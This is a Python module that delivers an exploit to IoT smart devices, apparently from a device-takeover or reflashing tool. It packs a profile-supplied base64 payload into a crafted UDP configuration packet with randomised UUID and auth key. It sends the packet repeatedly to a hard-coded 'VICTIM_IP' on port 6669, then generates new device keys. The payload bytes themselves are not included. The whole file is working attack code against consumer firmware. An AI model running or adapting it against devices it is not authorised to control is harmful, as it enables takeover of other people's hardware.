import base64
from distutils.command.config import config
import json
import time
import socket
import struct
import zlib
import string
import random
from typing import Dict
from .device import DeviceConfig

MAX_CONFIG_PACKET_PAYLOAD_LEN = 0xE8

VICTIM_IP = '192.168.175.1'
VICTIM_PORT = 6669

LOCAL_KEY_LENGTH = 16
SEC_KEY_LENGTH = 16
DEVICE_ID_LENGTH = 20
PSK_LENGTH = 32

def build_network_config_packet(payload):
    if len(payload) > MAX_CONFIG_PACKET_PAYLOAD_LEN:
        raise ValueError('Payload is too long!')
    # NOTE
    # fr_num and crc do not seem to be used in the disas
    # calculating them anyway - in case it's needed
    # for some reason.
    tail_len = 8
    head, tail = 0x55aa, 0xaa55
    fr_num, fr_type = 0, 0x1
    plen = len(payload) + tail_len
    buffer = struct.pack("!IIII", head, fr_num, fr_type, plen)
    buffer += payload
    crc = zlib.crc32(buffer)
    buffer += struct.pack("!II", crc, tail)
    return buffer

def send_network_config_datagram(datagram):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.sendto(datagram, (VICTIM_IP, VICTIM_PORT))

def encode_json_val(value):
    encoded = []
    escaped = list(map(ord, '"\\'))
    escape_char = ord('\\')
    for i in value:
        if i in escaped:
            encoded.append(escape_char)
        encoded.append(i)
    return bytes(encoded)

def check_valid_payload(value):
    eq_zero = lambda x: x == 0
    if any(map(eq_zero, value)):
        raise ValueError('At least one null byte detected in payload!')
    return value

def generate_random_ascii_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def create_device_specific_config(profile, uuid, auth_key) -> DeviceConfig:
    config = DeviceConfig({})

    config.set(DeviceConfig.UUID, uuid)
    config.set(DeviceConfig.AUTH_KEY, auth_key)
    config.set(DeviceConfig.LOCAL_KEY, generate_random_ascii_string(LOCAL_KEY_LENGTH))
    config.set(DeviceConfig.SEC_KEY, generate_random_ascii_string(SEC_KEY_LENGTH))
    config.set(DeviceConfig.DEVICE_ID, generate_random_ascii_string(DEVICE_ID_LENGTH))
    config.set(DeviceConfig.CHIP_FAMILY, profile['chip'].upper())
    
    # Currently not used
    # config.set(DeviceConfig.PSK, generate_random_ascii_string(PSK_LENGTH))
    
    return config

def exploit_device_with_config(profile: Dict) -> DeviceConfig:
    payload = base64.b64decode(profile['payload'])
    padding = base64.b64decode(profile['datagram_padding'])
    auth_key_template = profile['authkey_template'].encode('ascii')
    uuid_template = profile['uuid_template'].encode('ascii')

    uuid = generate_random_ascii_string(len(uuid_template))
    auth_key = generate_random_ascii_string(len(auth_key_template))

    payload = payload.replace(uuid_template, uuid.encode('ascii'))
    payload = payload.replace(auth_key_template, auth_key.encode('ascii'))
    payload = check_valid_payload(payload)

    datagram = build_network_config_packet(payload) + padding
    for _ in range(5):
        send_network_config_datagram(datagram)
        time.sleep(.200)

    return create_device_specific_config(profile, uuid, auth_key)